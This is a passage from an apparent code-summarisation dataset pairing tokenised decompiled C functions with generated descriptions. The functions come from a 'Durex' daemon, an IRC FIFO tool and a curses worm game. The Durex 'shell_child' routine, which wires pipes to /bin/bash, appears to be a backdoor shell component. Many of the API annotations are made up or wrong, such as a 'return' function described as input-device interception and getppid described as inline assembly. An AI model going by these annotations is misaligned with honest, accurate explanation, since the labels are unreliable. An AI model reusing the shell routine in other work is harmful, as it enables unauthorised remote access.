            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "argv",
            "[",
            "0",
            "]",
            "=",
            "\"/bin/sh\"",
            ";",
            "argv",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "close",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ")",
            ";",
            "close",
            "(",
            "*",
            "a2",
            ")",
            ";",
            "dup2",
            "(",
            "*",
            "a1",
            ",",
            "0",
            ")",
            ";",
            "dup2",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ",",
            "1",
            ")",
            ";",
            "close",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "close",
            "(",
            "a2",
            "[",
            "1",
            "]",
            ")",
            ";",
            "execv",
            "(",
            "\"/bin/bash\"",
            ",",
            "argv",
            ")",
            ";",
            "close",
            "(",
            "0",
            ")",
            ";",
            "close",
            "(",
            "1",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is used to read an unsigned 64-bit integer from a specific offset in the FS segment register on x86 architectures, typically used for low-level system programming or accessing thread information.",
            "The \"close\" function is likely used to close file descriptors or release resources in a C program, as indicated by its inclusion in code snippets containing file I/O operations like \"open,\" \"read,\" \"write,\" and \"close,\" along with memory mapping operations like \"mmap\" and \"munmap.\""
        ],
        "longer_label": "The given code defines a function called `shell_child` which sets up a shell with input/output redirection using file descriptors and executes `/bin/bash`, utilizing low-level system programming to access thread information."
    },
    {
        "id": 160,
        "docstring_tokens": [
            "The",
            "signal_handler",
            "function",
            "catches",
            "various",
            "signals",
            "and",
            "reports",
            "them",
            ",",
            "then",
            "destroys",
            "the",
            "server",
            "and",
            "releases",
            "the",
            "lock",
            "if",
            "the",
            "current",
            "process",
            "ID",
            "matches",
            "the",
            "PID",
            "of",
            "the",
            "Durex",
            "process",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "<",
            "=",
            "0x12",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "daemon_report",
            "(",
            "\"[ SIGNAL ]\"",
            ",",
            "\"SIGUNKNOWN signal caught.\"",
            ")",
            ";",
            "if",
            "(",
            "getpid",
            "(",
            ")",
            "=",
            "=",
            "g_durex",
            ")",
            "{",
            "server_destroy",
            "(",
            ")",
            ";",
            "unset_lock",
            "(",
            ")",
            ";",
            "}",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `server_destroyunset_lock` likely removes or deallocates a lock or synchronization mechanism associated with a server, ensuring proper cleanup and resource management."
        ],
        "longer_label": "The signal_handler function catches unknown signals, reports them as SIGUNKNOWN, and then calls server_destroy and unset_lock if the process ID matches g_durex, followed by exiting the program."
    },
    {
        "id": 161,
        "docstring_tokens": [
            "The",
            "signal_setup",
            "function",
            "sets",
            "up",
            "signal",
            "handlers",
            "for",
            "various",
            "signals",
            ",",
            "ignoring",
            "some",
            "and",
            "assigning",
            "a",
            "custom",
            "signal",
            "handler",
            "function",
            "for",
            "others",
            "."
        ],
        "code_tokens": [
            "__sighandler_t",
            "FUN0",
            "(",
            ")",
            "{",
            "signal",
            "(",
            "20",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "signal_handler",
            "+",
            "1",
            ")",
            ")",
            ";",
            "signal",
            "(",
            "22",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "signal_handler",
            "+",
            "1",
            ")",
            ")",
            ";",
            "signal",
            "(",
            "21",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "signal_handler",
            "+",
            "1",
            ")",
            ")",
            ";",
            "signal",
            "(",
            "1",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "2",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "3",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "4",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "6",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "8",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "11",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "13",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "14",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "10",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "12",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "signal",
            "(",
            "18",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "return",
            "signal",
            "(",
            "15",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "signal_handler",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `signal` function, typically defined in the `<signal.h>` header, is used for handling signals in C programming, allowing the assignment of signal handlers to specific signals, enabling the program to respond to events such as interrupts or errors.",
            "The `handler` function appears to be a part of a larger system, likely related to exception handling, signal handling, and possibly multi-process management, as indicated by the typedef of `Handler`, signal handling function prototype, and declarations of variables like `SharedLinks` and `SharedEvents`, suggesting involvement in coordinating processes or threads.",
            "The function `tsignal` appears to define a C struct for representing a signal, including integer and floating-point variables for different signal components, likely for use in signal processing or data analysis applications."
        ],
        "longer_label": "The provided code sets up signal handling for various signals, including assigning a signal handler function, likely forming part of a larger system involving exception handling, signal management, and potentially multi-process coordination, with indications of signal processing or data analysis application."
    },
    {
        "id": 162,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "usage",
            "''",
            "prints",
            "out",
            "the",
            "usage",
            "instructions",
            "for",
            "the",
            "program",
            "``",
            "fifoirc",
            "''",
            "by",
            "James",
            "Stanley",
            ",",
            "including",
            "options",
            "for",
            "channel",
            ",",
            "program",
            ",",
            "FIFO",
            "path",
            ",",
            "IRC",
            "full",
            "name",
            ",",
            "FIFO",
            "permission",
            "modes",
            ",",
            "nickname",
            ",",
            "port",
            ",",
            "NickServ",
            "password",
            ",",
            "reconnection",
            ",",
            "server",
            ",",
            "and",
            "verbosity",
            "level",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "puts",
            "(",
            "\"fifoirc by James Stanley\\n\"",
            "\"Usage: fifoirc [-c <channel>] [-e <program>] [-f <path to fifo>]\\n\"",
            "\"               [-F <full name>] [-m <mode>] [-n <nickname>]\\n\"",
            "\"               [-p <port>] [-P <nickserv password>] [-r]\\n\"",
            "\"               [-s <server>] [-vv]\\n\"",
            "\"\\n\"",
            "\"Options:\\n\"",
            "\" -c  channel to join\\n\"",
            "\" -e  program to pipe IRC text to (note: uses 'sh -c')\\n\"",
            "\" -f  path to the FIFO to use\\n\"",
            "\" -F  IRC full name\\n\"",
            "\" -m  FIFO permission modes in octal (default: 0666)\\n\"",
            "\" -n  IRC nickname\\n\"",
            "\" -p  port on the IRC server\\n\"",
            "\" -P  password to authenticate with NickServ\\n\"",
            "\" -r  reconnect to the server if the connection is lost\\n\"",
            "\" -s  server to connect to\\n\"",
            "\" -v  be verbose, specify twice to increase verbosity\\n\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function called `usage` which prints out usage information for a program called fifoirc, including various options, and exits with a status of 0, however, there are no annotations provided."
    },
    {
        "id": 163,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "FIFO",
            "file",
            "exists",
            ",",
            "creates",
            "one",
            "if",
            "it",
            "does",
            "not",
            ",",
            "and",
            "opens",
            "it",
            "for",
            "reading",
            "if",
            "successful",
            ",",
            "returning",
            "0",
            "on",
            "success",
            "or",
            "-1",
            "on",
            "failure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "*",
            "v1",
            ";",
            "char",
            "*",
            "v2",
            ";",
            "int",
            "*",
            "v3",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "struct",
            "stat",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "fifo_fd",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fifo_fd",
            ")",
            ";",
            "if",
            "(",
            "stat",
            "(",
            "fifo",
            ",",
            "&",
            "v5",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "umask",
            "(",
            "0",
            ")",
            ";",
            "if",
            "(",
            "mkfifo",
            "(",
            "fifo",
            ",",
            "fifo_perms",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "v1",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "strerror",
            "(",
            "*",
            "v1",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: mkfifo %s: %s\\n\"",
            ",",
            "fifo",
            ",",
            "v2",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "(",
            "v5",
            ".",
            "st_mode",
            "&",
            "0xF000",
            ")",
            "!",
            "=",
            "4096",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: %s: exists and is not a fifo\\n\"",
            ",",
            "fifo",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "fifo_fd",
            "=",
            "open",
            "(",
            "fifo",
            ",",
            "2048",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fifo_fd",
            "!",
            "=",
            "-",
            "1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v4",
            "=",
            "strerror",
            "(",
            "*",
            "v3",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: open %s: %s\\n\"",
            ",",
            "fifo",
            ",",
            "v4",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from the FS segment register on x86 architectures, facilitating access to thread-local storage or other specialized data structures in kernel or low-level programming contexts.",
            "The function \"close\" is likely a part of a larger codebase, facilitating memory management and file I/O operations, including opening and closing files, managing memory mappings, and directory iteration, with additional functionalities such as printing and scanning.",
            "The function `strerror` is used to retrieve a string representation of an error code or number, providing a human-readable explanation of the error that occurred within the context of system or library calls, as seen in error handling within the provided code snippets.",
            "The `fprintf` function is used in C programming to print formatted output to a specified output stream, such as `stderr` or `stdout`, typically for error handling or logging purposes."
        ],
        "longer_label": "The code is a function that creates a FIFO (named pipe) for inter-process communication, which includes error handling and uses system calls for file I/O operations and error retrieval."
    },
    {
        "id": 164,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "program",
            "with",
            "a",
            "socket",
            "pair",
            "and",
            "forks",
            "a",
            "child",
            "process",
            "to",
            "execute",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "*",
            "v1",
            ";",
            "char",
            "*",
            "v2",
            ";",
            "__pid_t",
            "v3",
            ";",
            "int",
            "fds",
            "[",
            "2",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "program_fd",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "program_fd",
            ")",
            ";",
            "if",
            "(",
            "socketpair",
            "(",
            "1",
            ",",
            "1",
            ",",
            "0",
            ",",
            "fds",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"fifoirc: socketpair\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "program_fd",
            "=",
            "fds",
            "[",
            "1",
            "]",
            ";",
            "childpid",
            "=",
            "fork",
            "(",
            ")",
            ";",
            "if",
            "(",
            "childpid",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"fifoirc: fork\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "childpid",
            ")",
            "{",
            "dup2",
            "(",
            "fds",
            "[",
            "0",
            "]",
            ",",
            "0",
            ")",
            ";",
            "dup2",
            "(",
            "fds",
            "[",
            "0",
            "]",
            ",",
            "1",
            ")",
            ";",
            "execl",
            "(",
            "\"/bin/sh\"",
            ",",
            "\"sh\"",
            ",",
            "\"-c\"",
            ",",
            "program",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "v1",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "strerror",
            "(",
            "*",
            "v1",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: execl /bin/sh -c %s: %s\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "program",
            ",",
            "v2",
            ")",
            ";",
            "v3",
            "=",
            "getppid",
            "(",
            ")",
            ";",
            "kill",
            "(",
            "v3",
            ",",
            "15",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is used to read a 64-bit value from the FS segment register, commonly employed in low-level programming for accessing thread information or processor-specific data structures on Windows operating systems, with different implementations for x86 and x64 architectures.",
            "The function `strerror` is being defined or referenced within different code snippets to provide error message strings corresponding to error numbers in a C program, serving to improve error reporting and handling by translating error codes into human-readable messages.",
            "The provided assembly code, specifically the `getppid` function, suggests it's likely part of a low-level system call implementation in an operating system, intended to retrieve the parent process ID (PPID) using the Linux syscall interface, with register manipulation through inline assembly."
        ],
        "longer_label": "The provided C code establishes a program with error handling and forking mechanisms, utilizing low-level functions like `__readfsqword` for accessing system-specific data, `strerror` for error message retrieval, and `getppid` for obtaining the parent process ID, enabling execution of a specified program within a new process."
    },
    {
        "id": 165,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "TCP",
            "connection",
            "to",
            "a",
            "given",
            "host",
            "and",
            "port",
            ",",
            "handling",
            "errors",
            "and",
            "providing",
            "verbose",
            "output",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "uint16_t",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "fd",
            ";",
            "struct",
            "hostent",
            "*",
            "v4",
            ";",
            "struct",
            "sockaddr",
            "s",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "=",
            "gethostbyname",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "{",
            "if",
            "(",
            "v4",
            "-",
            ">",
            "h_addrtype",
            "=",
            "=",
            "2",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "s",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "s",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "a2",
            ")",
            ";",
            "memcpy",
            "(",
            "&",
            "s",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "v4",
            "-",
            ">",
            "h_addr_list",
            ",",
            "v4",
            "-",
            ">",
            "h_length",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"fifoirc: socket\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "&",
            "s",
            ",",
            "0x10u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"fifoirc: connect\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "verbose",
            ">",
            "0",
            ")",
            "printf",
            "(",
            "\" -- connected to %s:%hu\\n\"",
            ",",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "fd",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: gethostbyname %s: not an IPv4 address\\n\"",
            ",",
            "a1",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: gethostbyname %s: failed\\n\"",
            ",",
            "a1",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `gethostby` seems to be used for resolving hostnames to IP addresses or vice versa, involving operations like DNS resolution and network address manipulation in C code.",
            "The memcpy function is used to copy a block of memory from one location to another, including potentially overlapping memory areas.",
            "The function `fprintf` is used to format and print data to a specified output stream, typically a file stream or standard output, as shown in the provided code snippets where it's used to print formatted output to stderr or stdout."
        ],
        "longer_label": "The provided code defines a function `make_tcp` which resolves a given hostname to an IPv4 address, creates a TCP socket, and connects to the specified host and port, handling errors and providing verbose output if enabled."
    },
    {
        "id": 166,
        "docstring_tokens": [
            "This",
            "function",
            "reads",
            "a",
            "line",
            "from",
            "a",
            "file",
            "descriptor",
            "up",
            "to",
            "a",
            "specified",
            "length",
            "and",
            "returns",
            "0",
            "if",
            "successful",
            "or",
            "-1",
            "if",
            "unsuccessful",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ",",
            "int",
            "a3",
            ")",
            "{",
            "_BYTE",
            "*",
            "v3",
            ";",
            "ssize_t",
            "v7",
            ";",
            "do",
            "{",
            "if",
            "(",
            "!",
            "-",
            "-",
            "a3",
            ")",
            "break",
            ";",
            "v7",
            "=",
            "read",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "1uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v7",
            "!",
            "=",
            "1",
            ")",
            "break",
            ";",
            "v3",
            "=",
            "a2",
            "+",
            "+",
            ";",
            "}",
            "while",
            "(",
            "*",
            "v3",
            "!",
            "=",
            "10",
            ")",
            ";",
            "*",
            "a2",
            "=",
            "0",
            ";",
            "if",
            "(",
            "v7",
            "=",
            "=",
            "1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function `get_line` that reads characters from a file descriptor `a1` into a buffer `a2` until it encounters a newline character or reads `a3` number of characters, returning 0 if successful or -1 if an error occurs."
    },
    {
        "id": 167,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "a",
            "character",
            "followed",
            "by",
            "the",
            "text",
            "with",
            "printable",
            "characters",
            "displayed",
            "as",
            "is",
            "and",
            "non-printable",
            "characters",
            "displayed",
            "as",
            "hexadecimal",
            "values",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "a1",
            ",",
            "_BYTE",
            "*",
            "a2",
            ")",
            "{",
            "printf",
            "(",
            "\"%c \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            ")",
            ";",
            "while",
            "(",
            "*",
            "a2",
            ")",
            "{",
            "if",
            "(",
            "(",
            "(",
            "*",
            "__ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "(",
            "char",
            ")",
            "*",
            "a2",
            "]",
            "&",
            "0x4000",
            ")",
            "!",
            "=",
            "0",
            ")",
            "putchar",
            "(",
            "(",
            "char",
            ")",
            "*",
            "a2",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"\\\\x%02x\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "char",
            ")",
            "*",
            "a2",
            ")",
            ";",
            "+",
            "+",
            "a2",
            ";",
            "}",
            "return",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function, likely customized here for use in a Reverse Polish Notation (RPN) calculator, is defined with additional macros and typedefs, facilitating custom formatting and potentially platform-specific behaviors, in addition to the typical usage for printing formatted output.",
            "The function \"putchar\" appears to be a low-level routine for outputting a character to a display or console, likely used in embedded systems or low-level programming contexts, as indicated by the inline assembly and memory manipulation.",
            "The \"return\" function appears to be a placeholder or a signal for indicating the end or exit point of various code snippets, potentially used in different contexts such as defining a scene in a graphics rendering program, managing interception contexts in device input manipulation, or as the termination point in a simple C program."
        ],
        "longer_label": "The provided code defines a function `safe_print` which formats and prints characters, including special characters represented as hexadecimal escape sequences, likely designed for use in a Reverse Polish Notation calculator or similar low-level programming context, utilizing `printf`, `putchar`, and memory manipulation, with the `return` statement serving as an exit point."
    },
    {
        "id": 168,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "the",
            "display",
            "by",
            "adding",
            "characters",
            "to",
            "create",
            "a",
            "border",
            "around",
            "the",
            "screen",
            "and",
            "printing",
            "the",
            "text",
            "``",
            "Worm",
            "!",
            "''",
            "in",
            "the",
            "center",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "wmove",
            "(",
            "stdscr",
            ",",
            "0",
            ",",
            "22",
            ")",
            ";",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "96",
            "]",
            ")",
            ";",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "96",
            "]",
            ")",
            ";",
            "printw",
            "(",
            "\" Worm! \"",
            ")",
            ";",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "96",
            "]",
            ")",
            ";",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "96",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "1",
            ",",
            "1",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "108",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "1",
            ",",
            "52",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "107",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "27",
            ",",
            "1",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "109",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "27",
            ",",
            "52",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "106",
            "]",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "2",
            ";",
            "i",
            "!",
            "=",
            "52",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "1",
            ",",
            "i",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "113",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "27",
            ",",
            "i",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "113",
            "]",
            ")",
            ";",
            "}",
            "for",
            "(",
            "j",
            "=",
            "2",
            ";",
            "j",
            "!",
            "=",
            "27",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "j",
            ",",
            "1",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "120",
            "]",
            ")",
            ";",
            "if",
            "(",
            "wmove",
            "(",
            "stdscr",
            ",",
            "j",
            ",",
            "52",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "waddch",
            "(",
            "stdscr",
            ",",
            "acs_map",
            "[",
            "120",
            "]",
            ")",
            ";",
            "}",
            "wrefresh",
            "(",
            "stdscr",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"print\" function is defined multiple times with different signatures and is used for printing information such as the contents of arrays or linked lists, potentially from file input, in C programming.",
            "The function `waddch` is used in C programming with the curses library to add a single character (specified by the `ch` parameter) to a specified window (`win`) at the current cursor position, utilizing curses data types such as `chtype` to represent characters with attributes like color and style.",
            "The \"addch\" function in the provided code snippets is a part of the NCURSES library and is used to add a single character, represented by a chtype, to the current position in a curses window."
        ],
        "longer_label": "The provided code snippet is initializing a text-based display using the NCURSES library in C, setting up a window with ASCII characters to create a bordered \"Worm!\" display."
    },
    {
        "id": 169,
        "docstring_tokens": [
            "The",
            "function",
            "irc_write",
            "writes",
            "the",
            "given",
            "text",
            "to",
            "a",
            "file",
            "descriptor",
            ",",
            "with",
            "additional",
            "formatting",
            "and",
            "possible",
            "verbose",
            "logging",
            "."
        ],
        "code_tokens": [
            "ssize_t",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "v2",
            ";",
            "char",
            "s",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "snprintf",
            "(",
            "s",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"%s\\r\\n\"",
            ",",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "verbose",
            ">",
            "1",
            ")",
            "safe_print",
            "(",
            "62",
            ",",
            "a2",
            ")",
            ";",
            "v2",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "return",
            "write",
            "(",
            "a1",
            ",",
            "s",
            ",",
            "v2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is utilized to read an unsigned 64-bit integer from the FS segment in assembly language, commonly employed for low-level system programming tasks like accessing thread information blocks (TIBs) on Windows operating systems.",
            "The `snprintf` function is used to safely format a string into a buffer with a specified size, preventing buffer overflow by truncating the output if necessary, as demonstrated in the provided code snippets where it's employed to construct file paths.",
            "The function \"strlen\" appears to be implemented in the provided code snippets as part of a larger program, likely for string manipulation and processing, using a variety of type definitions, macros, and auxiliary functions, emphasizing efficiency and compactness.",
            "The function named \"return\" likely serves as an interception context creation function for handling input devices in a system, such as keyboards or mice, by allocating memory, initializing device array, and configuring device names for interception."
        ],
        "longer_label": "The provided code is a function called `irc_write` which formats a given string `a2` into a buffer `s` using `snprintf`, prints it if verbosity is high enough using `safe_print`, calculates the length of the resulting string `s` using `strlen`, and finally writes it to a file descriptor `a1` using the `write` function, with additional context on the usage of `__readfsqword`, `snprintf`, and `strlen` provided for understanding its implementation details."
    },
    {
        "id": 170,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "connection",
            "to",
            "an",
            "IRC",
            "server",
            ",",
            "sets",
            "up",
            "the",
            "user",
            "'s",
